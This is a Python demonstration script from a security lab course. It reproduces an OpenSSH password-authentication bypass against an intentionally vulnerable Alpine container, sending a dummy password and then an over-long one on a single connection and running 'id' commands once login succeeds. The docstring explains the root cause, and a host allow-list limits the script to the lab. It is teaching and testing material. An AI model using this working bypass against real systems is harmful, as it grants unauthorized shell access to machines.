#!/usr/bin/env python3
"""
*sshole (CVE-2026-123158) demonstration for the web_infra_lab course.

Reproduces the OpenSSH password-authentication bypass against the
intentionally vulnerable `web-03` container (Alpine + OpenSSH 9.9p2-r0,
musl, no PAM).

SAFETY: This script only talks to the lab. It refuses to run against
any host other than localhost / the lab network, and it only ever
attempts logins against the lab's own intentionally vulnerable
container on localhost:2213. Never point it at a machine you do not
own or have explicit permission to test.

Usage:
    python3 sshhole_demo.py [host] [port] [user] [length]

Defaults: host=localhost port=2213 user=alpine length=300

Requires: pip install paramiko

Why TWO attempts on ONE connection?
    sshd's pick_salt() caches the borrowed salt in a static variable
    after the first password check. On the first attempt, pick_salt()
    walks /etc/shadow via getspnam() (musl returns a pointer into a
    static buffer) and explicit_bzero()s that buffer, which happens to
    erase the target account's stored "*" before the comparison — so
    the first attempt fails. On the second attempt on the same
    connection, pick_salt() returns the cached salt immediately, no
    shadow buffer is touched, pw_password is still "*", crypt()
    returns "*" for the over-long password, and strcmp("*", "*") == 0.
    See web-alpine/README.md for the full explanation.

Expected results (against web-03 as built in this repo):
    length=256 -> rejected   (musl crypt() still hashes normally)
    length=257 -> ACCEPTED   (musl crypt() fails -> "*")
    length=300 -> ACCEPTED
    same long password against `ubuntu` (a hashed account) -> rejected
    same long password against web-01 (Ubuntu, glibc+PAM) -> rejected
"""

import socket
import sys

import paramiko

# Safety guard: lab only. Refuse anything that is not localhost or a
# lab-network address, so this script cannot be pointed at a real host
# by accident.
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1", "172.26.0.13", "web-03"}


def try_login(host, port, user, passwords):
    """Try each password on ONE transport (one SSH connection).

    Returns True on the first accepted password.
    """
    sock = socket.create_connection((host, port), timeout=10)
    transport = paramiko.Transport(sock)
    transport.start_client(timeout=10)
    try:
        for pw in passwords:
            try:
                transport.auth_password(user, pw)
                print(f"  password len={len(pw)}: ACCEPTED")
                chan = transport.open_session()
                chan.exec_command("id; sudo -n id 2>/dev/null || doas id")
                out = chan.makefile().read().decode().strip()
                print(f"  id -> {out}")
                return True
            except paramiko.AuthenticationException:
                print(f"  password len={len(pw)}: rejected")
        return False
    finally:
        transport.close()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2213
    user = sys.argv[3] if len(sys.argv) > 3 else "alpine"
    length = int(sys.argv[4]) if len(sys.argv) > 4 else 300

    if host not in ALLOWED_HOSTS:
        print(
            f"Refusing to run against {host!r}: this demo is lab-only "
            f"(allowed: {', '.join(sorted(ALLOWED_HOSTS))}).",
            file=sys.stderr,
        )
        return 2

    print(f"Target: {user}@{host}:{port}  (lab only)")
    print("Attempt 1 primes sshd's pick_salt() cache; attempt 2 is the bypass.")
    ok = try_login(host, port, user, ["wrong", "A" * length])
    if ok:
        print(
            "RESULT: logged in without knowing any password — "
            "CVE-2026-123158 reproduced. See web-alpine/README.md §5 for the fix."
        )
        return 0
    print("RESULT: rejected — host is not vulnerable (patched, or preconditions missing).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
